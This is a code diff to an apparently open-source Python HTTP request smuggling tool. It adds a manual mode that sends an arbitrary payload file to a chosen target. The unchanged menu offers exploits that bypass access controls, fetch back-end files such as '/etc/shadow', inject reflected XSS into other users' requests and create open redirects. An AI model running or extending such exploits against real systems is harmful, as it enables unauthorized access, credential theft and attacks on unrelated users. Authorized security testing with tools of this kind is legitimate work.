@@ -185,6 +185,26 @@ def show_final_results(target, port, protocol, method, path, final):
         return target, port, protocol, method, path
     print("\n"+"="*50+"\n")
 
+def manual(): # manual exploiting menu
+    exploit_type = "MANUAL"
+    exploit_path = input("\n+ SELECT PATH TO EXPLOIT CODE (default: 'payloads/dummy.txt')")
+    if exploit_path == "":
+        exploit_path = "payloads/dummy.txt"
+    print("\n"+"="*50 + "\n")
+    print("[Info] Trying to EXPLOIT your own CODE (input: '"+exploit_path+"')...")
+    target, port, protocol, method, path, SSL = detect(False) # set target
+    addr = (target, port)
+    f = open(exploit_path, "r")
+    exploit = f.read()
+    f.close()
+    print("\n"+"-"*45)
+    for v in VULNERABLE_LIST:
+        print("="*50+"\n")
+        print("+ PAYLOAD TYPE: ["+exploit_type+"]")
+        print("+ EXPLOIT CODE:\n")
+        print(str(exploit))
+        send_exploit(addr, SSL, exploit, exploit_type, "MANUAL") # send exploit
+
 def exploit(): # exploit menu
     exploit = input("\n+ SELECT EXPLOIT:\n\n  [0] SMG-VER-01: VERIFY that your 'chunked' requests are arriving correctly\n  [1] SMG-REV-01: REVEAL if the front-end performs some REWRITING of requests before they are forwarded to the back-end\n  [2] SMG-ACL-01: GRANT ACCESS to a RESTRICTED URL (ex: '/restricted/salaries/boss.php', '/admin/', '/private/messages' ...)\n  [3] SMG-GET-01: GET a FILE from the back-end server (ex: '/etc/shadow', '/server/config_db.php' ...)\n  [4] SMG-XSS-01: INJECT a (simple) reflected XSS in the back-end (exploit 'User-Agent', 'Referer' vulnerability) and append it to the next user's request\n  [5] SMG-UFO-01: TURN an 'on-site' redirect into an OPEN REDIRECT and append it to the next user's request\n\n")
     if exploit == "0": # verify acccess (back-end)
@@ -199,7 +219,6 @@ def exploit(): # exploit menu
         exploit_XSS()
     elif exploit == "5": # open redirect (back-end)
         exploit_openredirect()
-
     else: # exit
         print ("[Info] Not any valid exploit selected... -> [EXITING!]\n")
         sys.exit()
@@ -677,7 +696,12 @@ print("\n"+"="*50)
 if option == "D": # detecting phase
     detect(True) # only detect
 elif option == "E": # trying to exploit
-    exploit()
+    exp_type = input("\n+ CHOOSE: (A)utomatic or (M)anual: ").upper()
+    print("\n"+"="*50)
+    if exp_type == "M": # trying manual payload
+        manual()
+    else: # automatic exploits
+        exploit()
 else:
     print("\n"+"-"*45+"\n")
     print("[Smuggler by psy (https://03c8.net)]\n\n  Bye! ;-)\n")
